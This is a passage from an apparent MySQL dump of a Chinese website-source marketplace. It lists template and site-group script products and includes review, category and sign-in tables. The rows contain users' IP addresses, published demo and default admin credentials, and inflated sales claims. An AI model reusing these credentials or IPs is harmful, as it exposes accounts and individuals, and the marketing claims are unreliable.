'discuz克米设计APP手机版v3.5送15套配套插件教程分类信息dz模板', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(255, '1560094323-14', '', 14, '2019-06-09 23:32:03', '2019-06-09 23:32:15', '223.159.252.9', 38, 69, 0, 0, 'xcf', '易经风水网站模板 八字算命 测字易经协会培训 带移动端 高端大气', '<p>易经风水网站模板 测字易经协会培训 带移动端 高端大气 <br/><br/><br/><img src="/querylist/img/2019-06-09/201906091132104102.png"/><br/></p>', 12, 0, 10000, 60, 60, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 2, 1, '', '', NULL, 'http://t.cn/Evqkgrr', NULL, '易经风水网站模板 八字算命 测字易经协会培训 带移动端 高端大气', '易经风水网站模板 八字算命 测字易经协会培训 带移动端 高端大气', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(256, '1560094352-14', '', 14, '2019-06-09 23:32:32', '2019-06-09 23:32:47', '223.159.252.9', 38, 72, 0, 0, 'xcf', '企业发卡网源码发卡平台源码全开源运营版', '<p>程序全开源,在运营版本,既然做就要把他当做一项事业来做。<br/>程序授权出售,完整运营级程序，非市面上垃圾程序BUG一堆。<br/>此程序经过市场验证，每日百万级流水无压力，记者小白勿扰。<br/>程序功能过多，功能自行查看演示站点。<br/>授权版本后期同步官方更新。演示即所得。<br/>演示站点：http://xinlanse.com<br/>测试账号：test@qq.com<br/>测试密码：123456<br/>需要测试后台请联系销售客服获取。无诚意者勿扰。<br/><br/><br/><img src="/querylist/img/2019-06-09/201906091132380720.png"/><br/><img src="/querylist/img/2019-06-09/201906091132397478.png"/><br/><img src="/querylist/img/2019-06-09/201906091132398589.png"/><br/><img src="/querylist/img/2019-06-09/201906091132407873.png"/><br/><img src="/querylist/img/2019-06-09/201906091132400458.png"/><br/><img src="/querylist/img/2019-06-09/201906091132414195.png"/><br/></p>', 24, 0, 10000, 16800, 16800, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 1, 1, '', '', NULL, 'http://t.cn/R77xy9r', NULL, '企业发卡网源码发卡平台源码全开源运营版', '企业发卡网源码发卡平台源码全开源运营版', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(245, '1560093851-14', '', 14, '2019-06-09 23:24:11', '2019-06-09 23:24:31', '223.159.252.9', 38, 69, 0, 0, 'xcf', 'dedecms响应式滚屏摄影相册企业官网网站织梦模板源码带后台自适应手机端带后台', '<br><br><img src=''/querylist/img/2019-06-09/201906091124199934.png''/><br><img src=''/querylist/img/2019-06-09/201906091124195651.png''/><br><img src=''/querylist/img/2019-06-09/201906091124198118.png''/><br><img src=''/querylist/img/2019-06-09/201906091124200636.png''/><br>', 10, 0, 10000, 49, 49, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/E6rtkhp', NULL, 'dedecms响应式滚屏摄影相册企业官网网站织梦模板源码带后台自适应手机端带后台', 'dedecms响应式滚屏摄影相册企业官网网站织梦模板源码带后台自适应手机端带后台', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(246, '1560093907-14', '', 14, '2019-06-09 23:25:07', '2019-06-09 23:25:28', '223.159.252.9', 38, 69, 0, 0, 'xcf', 'discuz模板 Energy企业/公司/产品 公司展示网站门户论坛 dz模板', '模板演示地址：http://114.215.106.135/dn/energy/portal.php<br>模板测试账号密码:test , test123<br>模板功能简介介绍：<br>1.模板名称：Energy企业/公司/产品，版本支持：discuzx3.0版本，discuzx3.1版本，discuzx3.2版本，网站页面宽度1180px，网站代码工整简洁seo优化良好，让您网站更佳汇聚人气，助您网站成功！具体使用教程，请参考使用word文档详细说明。<br>2.模板门户首页，论坛门户首页，论坛首页，列表页，内容页，以及文章页面数据采用DIY数据读取，方便新手老手运营以及后期维护，时尚大气简洁。模板添加了不少处动画效果，增加用户体验和粘度。<br>3.模板有很多细节都有体现，同时对官方模板文件结构和功能位置做了更为优化的设计处理，无论是在前端界面上还是在CCS代码优化上。<br><br>4.模板对css3支持很多，用谷歌火狐以及ie9版本以上的朋友可以看到不错的动画效果。<br><br><br><img src=''/querylist/img/2019-06-09/201906091125147101.png''/><br><img src=''/querylist/img/2019-06-09/201906091125141322.png''/><br><img src=''/querylist/img/2019-06-09/201906091125150213.png''/><br><img src=''/querylist/img/2019-06-09/201906091125157083.png''/><br>', 10, 0, 10000, 40, 40, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/RQbKvuu', NULL, 'discuz模板 Energy企业/公司/产品 公司展示网站门户论坛 dz模板', 'discuz模板 Energy企业/公司/产品 公司展示网站门户论坛 dz模板', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(247, '1560093952-14', '', 14, '2019-06-09 23:25:52', '2019-06-09 23:26:10', '223.159.252.9', 38, 69, 0, 0, 'xcf', '企业多城市地区目录站群企业分站站群系统程序源码二级域名带WAP', '<b>注意:购买前请咨询客服.默认购买程序价格为目录站群,非二级域名站群</b><br><br><br><img src=''/querylist/img/2019-06-09/201906091125590166.png''/><br><img src=''/querylist/img/2019-06-09/201906091125594489.png''/><br><img src=''/querylist/img/2019-06-09/201906091126009738.png''/><br><img src=''/querylist/img/2019-06-09/201906091126008992.png''/><br><img src=''/querylist/img/2019-06-09/201906091126011858.png''/><br><img src=''/querylist/img/2019-06-09/201906091126012038.png''/><br>', 11, 0, 10000, 2000, 2000, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/REOmjBT', NULL, '企业多城市地区目录站群企业分站站群系统程序源码二级域名带WAP', '企业多城市地区目录站群企业分站站群系统程序源码二级域名带WAP', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(248, '1560093985-14', '', 14, '2019-06-09 23:26:25', '2019-06-09 23:26:54', '223.159.252.9', 38, 69, 0, 0, 'xcf', '装修环保站群/装修公司/企业模版 / 极速企业站群系统', '<b>注意:购买前请咨询客服.默认购买程序价格为目录站群,非二级域名站群</b><br><br><br><br><br><br><img src=''/querylist/img/2019-06-09/201906091126329270.png''/><br><img src=''/querylist/img/2019-06-09/201906091126326533.png''/><br><img src=''/querylist/img/2019-06-09/201906091126339838.png''/><br><img src=''/querylist/img/2019-06-09/201906091126331084.png''/><br>', 8, 0, 10000, 298, 298, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/EMZgqTc', NULL, '装修环保站群/装修公司/企业模版 / 极速企业站群系统', '装修环保站群/装修公司/企业模版 / 极速企业站群系统', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(249, '1560094030-14', '', 14, '2019-06-09 23:27:10', '2019-06-09 23:27:27', '223.159.252.9', 38, 69, 0, 0, 'xcf', '极速独立站群,cms独立站群,跨服务器站群,门户网站群系统', '<b>注意:购买前请咨询客服.默认购买程序价格为目录站群,非二级域名站群</b><br><br><br>极速CMS是国内最主流的CMS系统之一。站群系统主要面向政府、学校、集团。极速站群模式为“主站+分站”的模式，每个分站均属独立的系统，采用独立的数据库、顶级域名、不同的服务器。站群系统支持千万级数据负载、高安全、体系化、模块化均是其核心优势，是国内公认的最领先的站群平台。<br>          系统完全支持可视化拖拽方式制作和维护，集策划、设计和维护于一体，通过数据接口可聚合多系统内容。编辑就能快速做专题，无需设计和技术参与，制作周期短、成本低、效果好。<br>网 站 功 能<br>极速CMS系统可在包括PC端、移动WAP端（兼容IOS和Android版本）、WAP、html5、RSS以及电视、微博、微信、微网站等多平台发布内容，完美兼容各平台显示，能够将网站的文章、组图、视频、音频和专题等多种丰富的内容类型展现出来，带给客户愉快的阅读体验。<br>极速CMS除了支持以站点、栏目、文章、产品为基本单位的内容组织方式以外，还支持链接栏目、虚拟栏目、tag词分类、标签、网站轮链、后台多样化调用、多维分类等多种复杂内容组织形式。、<br>极速CMS支持绝大部分常见内容形式的编辑与发布，包括文章、图片、视频、音频、附件、专题、报纸、杂志等，还支持通过开发插件的方式添加全新的内容类型。<br> <br>极速软件构建了一套完整的PHP功能体系，并为此体系提供了基于Eclipse的ZDeveloper开发工具，使得客户的个性化需求通过可插拔的插件来实现。<br> 极速CMS提供了全面的应用层安全机制，对主要的威胁网站安全的问题进行了系统的处理。防止非法文件上传，防止越权访问,实现服务器分开布署,分开权限管理,分站点创建,不会引响任何站点之间的权限和访问。<br> 极速CMS专题系统支持自由布局、自由插入各种展现形式的内容。还支持从本站或其他站采集引用内容和资源及内容精选与加工；专题模块元素丰富，包含视频、组图、下载等。可视化是系统易用性的一种具体表现形式，它极大的推动了互联网平台面向普通建站人群，大幅降低了门槛；极速CMS是可视化应用的始创方和推动方，是国内公认的可视化应用最强的平台提供商。将功能都做成可选形式，每个功能配合各类模板和参数配置，成熟的标签模式可以实现功能的任意位置调用。支持在线模板和标签的可视化编辑，并可直接预览。<br> <br> 极速CMS的模板引擎在性能、严谨性、灵活性、可扩展性上都是业内首屈一指的。千万级数据负载，海量数据检索是一个CMS成熟与否的典型标志。平台在千万级数据下，页面打开快速、后台翻页快速、搜索快速，在海量数据下，系统页面速度很快，支持meacached和页面压缩功能，高负载技术是一个综合性要求很高的技术应用。极速CMS是国内少数常规环境下提供千万级负载体验的厂商；海量数据搜索瓶颈完美解决，千万级数据搜索只需几毫秒。<br> 极速站群CMS通过高性能的模板机制，创造性地实现了动态,伪静态功能的模板化。动态功能的业务逻辑和界面展示实现了完全分离。界面展示部分通过模板动态生成，同一个分站网站功能在不同的站点下可以有不同的模板。<br> 极速CMS提供了高度集成的网站后台工作界面，在此界面下的视图有文章编辑视图、工作流视图、区块视图、页面部件视图，开发人员也可以通过插件扩展其他视图。<br> 极速CMS支持在系统内建立多达5000个站点，提供网站群的采集与分发的功能，支持集群部署方式，支持站内多媒体,文 章,产品,招聘,资源的分离部署,支持跨服务器布署分站点。<br> <br><br> 极速CMS站群支持多模版切换功能,全站目前有六十个网站模版,可提供建立网站分站.不同的公司可以选不多的模版,对网站排名关键字优化起到决定性的作用.全站经过SEO优化.网站排名相当理想．<br><br><br><img src=''/querylist/img/2019-06-09/201906091127180099.png''/><br><img src=''/querylist/img/2019-06-09/201906091127195322.png''/><br><img src=''/querylist/img/2019-06-09/201906091127193166.png''/><br><img src=''/querylist/img/2019-06-09/201906091127204881.png''/><br><img src=''/querylist/img/2019-06-09/201906091127205851.png''/><br><img src=''/querylist/img/2019-06-09/201906091127213156.png''/><br>', 7, 0, 10000, 18000, 18000, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/R7Nrdnt', NULL, '极速独立站群,cms独立站群,跨服务器站群,门户网站群系统', '极速独立站群,cms独立站群,跨服务器站群,门户网站群系统', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(250, '1560094057-14', '', 14, '2019-06-09 23:27:37', '2019-06-09 23:27:58', '223.159.252.9', 38, 72, 0, 0, 'xcf', '装修环保站群/装修公司/企业模版 / 极速企业站群系统', '<b>注意:购买前请咨询客服.默认购买程序价格为目录站群,非二级域名站群</b><br><br><br><br><br><br><img src=''/querylist/img/2019-06-09/201906091127491694.png''/><br><img src=''/querylist/img/2019-06-09/201906091127505945.png''/><br><img src=''/querylist/img/2019-06-09/201906091127502855.png''/><br><img src=''/querylist/img/2019-06-09/201906091127502125.png''/><br>', 11, 0, 10000, 298, 298, 0, 1, '', NULL, NULL, 0, NULL, 5, 5, 5, 0, 1, '', '', NULL, 'http://t.cn/EMZgqTc', NULL, '装修环保站群/装修公司/企业模版 / 极速企业站群系统', '装修环保站群/装修公司/企业模版 / 极速企业站群系统', '', 0, 0, 0, NULL, '', 0, 0, 0, NULL, 0, ''),
(251, '1560094093-14', '', 14, '2019-06-09 23:28:13', '2019-06-09 23:28:33', '223.159.252.9', 38, 72, 0, 0, 'xcf', '新品ASP演艺模特企业网站源码程序后台管理 文化传媒网站建设源码', '<p><br/><br/><img src="/querylist/img/2019-06-09/201906091128218013.png"/><br/><img src="/querylist/img/2019-06-09/201906091128212048.png"/><br/><img src="/querylist/img/2019-06-09/201906091128223370.png"/><br/><img src="/querylist/img/2019-06-09/201906091128233381.png"/><br/><img src="/querylist/img/2019-06-09/201906091128234036.png"/><br/><img src="/querylist/img/2019-06-09/201906091128246042.png"/><br/><img src="/querylist/img/2019-06-09/201906091128249215.png"/><br/>网站程序的后台界面截图<br/><br/><br/><img src="/querylist/img/2019-06-09/201906091128252953.png"/><br/><img src="/querylist/img/2019-06-09/201906091128257815.png"/><br/><img src="/querylist/img/2019-06-09/201906091128265572.png"/><br/><img src="/querylist/img/2019-06-09/201906091128261864.png"/><br/><img src="/querylist/img/2019-06-09/201906091128265496.png"/><br/></p>', 8, 0, 10000, 30, 30, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 6, 1, '', '', NULL, 'http://t.cn/EIOu2KU', NULL, '新品ASP演艺模特企业网站源码程序后台管理 文化传媒网站建设源码', '新品ASP演艺模特企业网站源码程序后台管理 文化传媒网站建设源码', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(252, '1560094132-14', '', 14, '2019-06-09 23:28:52', '2019-06-09 23:29:09', '223.159.252.9', 38, 72, 0, 0, 'xcf', '织梦自适应瀑布流图片站模板', '<p><strong>模板名称：</strong><br/><strong>织梦自适应瀑布流图片站模板</strong><br/><strong>模板介绍：</strong><br/>简约时尚的图片站模板，瀑布流自适应织梦模板。<br/>本模板风格主打简约时尚的风格，整体以瀑布流样式展现，并且根据分辨率大小而自动适应排版，<br/>非常适合做一些图片新闻网站、搞笑图片网站模板以及美女图片网站都非常适合。<br/>网站采用的织梦utf8本，内容页可以由用户自定义是列表展示还是幻灯或者全屏播放图片，非常方便提升用户体验。相信大家都知道，<br/>现在这样的瀑布流自适应模板样式是非常流行的，很多知名网站也有改版成这样的风格，织梦97推出这套模板并且低价出售，相信正是您搭建图片网站的哦。<br/>下面多素材为您简要介绍下这套织梦自适应瀑布流模板的特点吧：<br/><br/><br/>模板特点：<br/>1、严格测试，完美兼容谷歌，火狐，ie，360，百度，淘宝以及opera等主流浏览器2、全站div+css布局3、代码精简优化，利于网页打开速度4、首页列表页瀑布流样式5、首页列表页自适应风格，兼顾各种分辨率窗口6、模板包含首页、列表页、内容页、搜索页、tag列表页<br/><strong> 使用程序：</strong><br/>织梦DEDECMS版本都可以使用。<br/><br/><strong> 模板页面：</strong><br/><br/>index.htm 首页模板<br/><br/><br/>head.htm<br/><br/><br/>footer.htm <br/><br/><br/>article_article.htm 文章内容<br/><br/>这里不一一列出！ 温馨提示：按照正常的织梦安装步骤来安装还原就可以用了，从后台重新点击保存下系统基本参数。 系统&gt;系统基本参数&gt; 保存（确定）。 后期bug修正：暂无网站截图：<br/><br/><br/></p>', 21, 0, 10000, 38, 38, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 5, 1, '', '', NULL, 'http://t.cn/Re3JVC9', NULL, '织梦自适应瀑布流图片站模板', '织梦自适应瀑布流图片站模板', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(253, '1560094186-14', '', 14, '2019-06-09 23:29:46', '2019-06-09 23:30:14', '223.159.252.9', 38, 72, 0, 0, 'xcf', 'Thinkphp5+layui开源中文响应式后台源码【原创】-533', '<p>=====================================================<br/><span style="color:&gt;源码具有复制性，出售即不退款，请自己测试好再购买。&lt;/font&gt;&lt;br&gt;&lt;font color=">注意：近期有好多不良店铺模仿本店，请亲们购买的时候认准【集志达】</span><br/><br/><br/>&lt;font color=&#39;&gt;购买须知：代码开源无加密，由于源码具有可复制性不能退款，请仔细查看说明，满意后再拍，做不到完美无Bug，追求完美者勿拍，感谢您的理解支持。<br/><br/>=====================================================<br/>如需安装请联系客服，否则无法保证具体安装时间！如需要域名、服务器等请联系客服低价购买<br/><br/><br/><br/><br/></p>', 12, 0, 10000, 30, 30, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 4, 1, '', '', NULL, '', NULL, 'Thinkphp5+layui开源中文响应式后台源码【原创】-533', 'Thinkphp5+layui开源中文响应式后台源码【原创】-533', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, ''),
(254, '1560094233-14', '', 14, '2019-06-09 23:30:33', '2019-06-09 23:30:56', '223.159.252.9', 38, 72, 0, 0, 'xcf', 'ID201：中/英语【自适应】建材/卫浴/五金配件Php源码SEO结构', '<p>点击上方：<span style="font-size:32px"><strong style=""><span style="color:#ff0000">查看</span><span style="color:#0000ff">演示</span></strong></span>或复制下方网址浏览<br/>案例及多平台演示（<strong><span style="color:#0000ff">兼容PC电脑 &nbsp;/ &nbsp;手机 &nbsp;/ &nbsp;平板 &nbsp;/ &nbsp;微信</span></strong>）：<br/><span style="font-size:24px">http://<span style="color:#ff0000">www.www-asp.com</span>/php15/21.html</span>（复制网址到浏览器访问）<br/>如果代码不对或版本不对，请联系我们。<br/><br/><br/><img src="/querylist/img/2019-06-09/201906091130463701.png"/><br/><span style="font-size:32px;color:#ff00ff">上方“查看</span><span style="font-size:32px;color:#ff0000"><strong>演示</strong></span><span style="font-size:32px;color:#ff00ff">”</span><br/><span style="font-size:32px;color:#ff00ff"><br/></span><br/><span style="font-size:32px"><span style="color:#ff0000;">真响应【</span><span style="text-align: center;"><span style="color:#0000ff">兼</span><span style="color:#ff0000">容</span></span><span style="text-align: left;"><span style="color:#0000ff;">】</span></span></span><br/><span style="text-align: center;">所有设备：（<span style="font-size:32px"><strong><span style="color:#ff0000">PC电脑</span> + <span style="color:#008000">手机</span> + <span style="color:#0000ff">平板</span> + <span style="color:#ffcc00">微信</span></strong></span>）</span><br/><br/><br/><br/><br/><span style="font-size:32px;color:#000000"><strong>网页显示出错</strong></span><br/><span style="color:#000000"><span style="font-size:16px">1、站点已开启伪静态，可能与您新数据不配对，就进入后台 &nbsp;〉左侧导航</span> &nbsp;〉<span style="font-size: medium;">SEO优化</span> &nbsp;〉</span><span style="font-size:18px;color:#ff0000"><strong>伪静态设置，选“否”</strong></span>；2、右上角“清理缓存”后期随时可开启伪静态。<br/><br/><br/><strong><span style="font-size:32px">没有演示站内容那么齐全</span></strong><br/>想跟演示站一样图文齐全，就把源码里的“数据库”文件夹选其一导入到主机MYSQL数据库（提示：导入前可能要删除原数据）<br/><br/><br/><span style="font-size:32px"><strong><span style="color:#ff0000">伪静态</span>的优点有6点</strong></span>：<br/>1、对<span style="font-size:16px;color:#0000ff"><strong>Seo优化</strong></span>而言,伪静态比静态更有优势.<br/>2、维护方便，网页每天都自动变化，不用维护或者说极大地减少了<span style="font-size:16px;color:#0000ff"><strong>维护</strong></span>量。<br/>3、可以方便的实现对搜索引擎的优化，易于被<span style="font-size:16px;color:#0000ff"><strong>搜索引擎</strong></span>收录。<br/>4、缩短了url的长度，隐藏文件实际路径提高了<span style="font-size:16px;color:#0000ff"><strong>安全性</strong></span>，易于用户记忆和输入。<br/>5、<span style="font-size:16px;color:#0000ff"><strong>占空间</strong></span>比较小，不像纯静态那样多占用近过多的空间。<br/>6、<span style="font-size:16px;color:#0000ff"><strong>安全性</strong></span>能通过url地址隐藏或加密，让黑客无法找到真实的动态页面，同时动态文件不需要太高的权限，从而避免了木马的注入。<br/><br/><br/>语言<em>PHP + </em>数据库<em>Mysql &nbsp;/ &nbsp;压缩大小：7M左右</em><br/><span style="color:#ff0000;font-size:18px">后台用户admin密码admin或admin113</span><br/><br/><br/><strong><span style="font-size:32px">功能齐全</span></strong><br/><span style="font-size:18px"><span style="color:#ff0000">【1、】</span>Php+Mysql，上传安装即可使用，图片文字要自行上传，后台可全部实现操作。</span><br/><span style="font-size:18px"><span style="color:#ff0000">【2、】</span>SEO功能--Php源码可选择动态、伪静态模式，根据自己的Seo优化需要自由选择--伪静态和自定义Url</span><br/><span style="font-size:18px"><span style="color:#ff0000">【3、】</span>SEO功能--生成【百度地图】、【谷歌地图】，便于蜘蛛爬行抓取，有助于收录提高；</span><br/><span style="font-size:18px"><span style="color:#ff0000">【4、】</span>SEO功能--程序自带404错误页面，对搜索引擎、用户更加友好！利于优化！</span><br/><span style="font-size:18px"><span style="color:#ff0000">【5、】</span>SEO功能--在线客服系统，独有授权人物展示企业形象，提高客户体验度。</span><br/><span style="font-size:18px"><span style="color:#ff0000">【6、】</span>SEO功能--内链和标签优化管理，只设置一次，所有页面内容，遇到某个关键词自动加上链接！！</span><br/><span style="font-size:18px"><span style="color:#ff0000">【7、】</span>支持上传图片设置水印</span><br/><span style="font-size:18px"><span style="color:#ff0000">【8、】</span>SEO功能--每个页面自定义title、keywords 、descri-ption</span><br/><span style="font-size:18px"><span style="color:#ff0000">【9、】</span>单语 或/ 中英双语版自由选择，首页是中文 或/ 英文版自由选择</span><br/><br/><br/><span style="font-size:32px"><span style="color:#880000">【</span><span style="color:#ff0000">赠</span><span style="color:#0000ff">送</span><span style="color:#008080">】</span></span><br/><span style="font-size:16px;color:#ff0000"><strong><span style="text-decoration:underline;">提示：</span></strong></span>【<strong style="color: rgb（255, 0, 0）; font-size: medium;"><span style="text-decoration:underline;">赠送</span></strong>】<strong style=""><span style="text-decoration:underline;"><span style="font-size:16px;color: rgb（255, 0, 0）;">部 分 单 独 联 系 我 们 发 送。</span><span style="font-size:24px;"><span style="color:#0000ff">！</span><span style="color:#ff0000">！</span><span style="color:#00ff00">！赠送部分如下图列表一致完整.</span></span></span></strong><br/><span style="font-size:18px">1、<span style="color:#ff0000">【赠送】</span>6.3G UI界面素材</span><br/><span style="font-size:18px">2、<span style="color:#ff0000">【赠送】</span>2300套PHP整站源码</span><br/><span style="font-size:18px">3、<span style="color:#ff0000">【赠送】</span>160套Java源码带后台带数据</span><br/><span style="font-size:18px">4、<span style="color:#ff0000">【赠送】</span>价值2000元的SEO优化视频教程</span><br/><span style="font-size:18px">5、<span style="color:#ff0000">【赠送】</span>phpweb整站源码模板</span><br/><span style="font-size:18px">6、<span style="color:#ff0000">【赠送】</span>1500套ASP.NET整站源码</span><br/><span style="font-size:18px">7、<span style="color:#ff0000">【赠送】</span>6000套IOS源码+4000套安卓源码</span><br/><span style="font-size:18px">8、<span style="color:#ff0000">【赠送】</span>800套HTML5网页模板打包</span><br/><br/><br/></p>', 15, 0, 10000, 38, 38, 0, 1, '', NULL, NULL, 0, 0, 5, 5, 5, 3, 1, '', '', NULL, 'http://t.cn/EMk1ogi', NULL, 'ID201：中/英语【自适应】建材/卫浴/五金配件Php源码SEO结构', 'ID201：中/英语【自适应】建材/卫浴/五金配件Php源码SEO结构', '', 0, 0, 0, '', '', 0, 0, 0, NULL, 0, '');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_profav`
--

CREATE TABLE IF NOT EXISTS `yjcode_profav` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `probh` char(50) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `selluserid` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_propj`
--

CREATE TABLE IF NOT EXISTS `yjcode_propj` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `probh` char(50) DEFAULT NULL,
  `selluserid` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `pf1` int(11) DEFAULT NULL,
  `pf2` int(11) DEFAULT NULL,
  `pf3` int(11) DEFAULT NULL,
  `txt` text,
  `hf` text,
  `hfsj` datetime DEFAULT NULL,
  `orderbh` char(50) DEFAULT NULL,
  `pjlx` int(10) DEFAULT NULL,
  `iftp` int(10) DEFAULT NULL,
  `ifvideo` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=30 ;

--
-- 转存表中的数据 `yjcode_propj`
--

INSERT INTO `yjcode_propj` (`id`, `probh`, `selluserid`, `userid`, `sj`, `uip`, `pf1`, `pf2`, `pf3`, `txt`, `hf`, `hfsj`, `orderbh`, `pjlx`, `iftp`, `ifvideo`) VALUES
(28, '1554700535-15', 15, 14, '2019-05-15 01:29:35', '223.96.217.39', 5, 5, 5, '交易完成超过3天未评价，默认好评', NULL, NULL, '1557595775070', NULL, NULL, NULL),
(29, '1554700535-15', 15, 955, '2019-05-16 15:42:24', '223.96.217.39', 5, 5, 5, '交易完成超过3天未评价，默认好评', NULL, NULL, '1557733344179', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_protype`
--

CREATE TABLE IF NOT EXISTS `yjcode_protype` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `name1` char(50) DEFAULT NULL,
  `name2` char(50) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `xh` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `zt` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=8 ;

--
-- 转存表中的数据 `yjcode_protype`
--

INSERT INTO `yjcode_protype` (`id`, `bh`, `userid`, `name1`, `name2`, `admin`, `xh`, `sj`, `zt`) VALUES
(1, '1505662855p15', 15, '直销系统', NULL, 1, 1, '2017-09-17 23:40:55', 0),
(2, '1505662864p15', 15, '微商程序', NULL, 1, 2, '2017-09-17 23:41:04', 0),
(3, '1511006446p111', 111, '9999', NULL, 1, 1, '2017-11-18 20:00:46', 0),
(4, '1511113587p128', 128, '22222', NULL, 1, 1, '2017-11-20 01:46:27', 0),
(7, '1560932882p952', 952, '软件开发', NULL, 1, 1, '2019-06-19 16:28:02', 0);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_prouserdj`
--

CREATE TABLE IF NOT EXISTS `yjcode_prouserdj` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `probh` char(50) DEFAULT NULL,
  `userid` int(10) DEFAULT NULL,
  `djname` char(50) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `zhi` float DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=253 ;

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_provideo`
--

CREATE TABLE IF NOT EXISTS `yjcode_provideo` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(10) DEFAULT NULL,
  `probh` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `djl` int(10) DEFAULT NULL,
  `url` text,
  `bh` char(50) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `iftj` int(10) DEFAULT NULL,
  `txt` text,
  `zt` int(10) DEFAULT NULL,
  `gs` char(20) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=11 ;

--
-- 转存表中的数据 `yjcode_provideo`
--

INSERT INTO `yjcode_provideo` (`id`, `userid`, `probh`, `sj`, `tit`, `djl`, `url`, `bh`, `admin`, `iftj`, `txt`, `zt`, `gs`) VALUES
(10, 952, '1560933357-952', '2019-06-19 16:36:02', '智能养卡代还APP软件', 1, NULL, '1560933362v952', 1, 1, NULL, 0, 'swf');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_qiandao`
--

CREATE TABLE IF NOT EXISTS `yjcode_qiandao` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(10) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(50) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `jf` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=60 ;

--
-- 转存表中的数据 `yjcode_qiandao`
--

INSERT INTO `yjcode_qiandao` (`id`, `userid`, `sj`, `uip`, `tit`, `jf`) VALUES
(8, 14, '2017-03-03 11:59:06', '223.157.131.226', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(9, 15, '2017-03-03 20:57:29', '223.157.131.226', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(10, 16, '2017-03-04 10:30:42', '58.16.197.93', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(11, 16, '2017-03-05 15:33:08', '58.16.197.56', '按时签到是个好习惯^_^ 签到拿分走人(连续签到2天)', 6),
(12, 30, '2017-03-25 22:38:00', '111.73.175.22', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(13, 30, '2017-03-26 17:43:40', '111.73.168.171', '按时签到是个好习惯^_^ 签到拿分走人(连续签到2天)', 6),
(14, 31, '2017-03-28 00:22:08', '120.85.67.108', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(15, 14, '2017-03-29 20:32:45', '222.242.68.98', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(16, 47, '2017-05-07 14:39:07', '36.149.71.177', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(17, 49, '2017-05-08 07:33:24', '106.59.107.50', '按时签到是个好习惯^_^ 签到拿分走人', 10),
(18, 64, '2017-05-22 23:30:00', '117.34.13.60', '按时签到是个好习惯^_^ 签到拿分走人', 10),
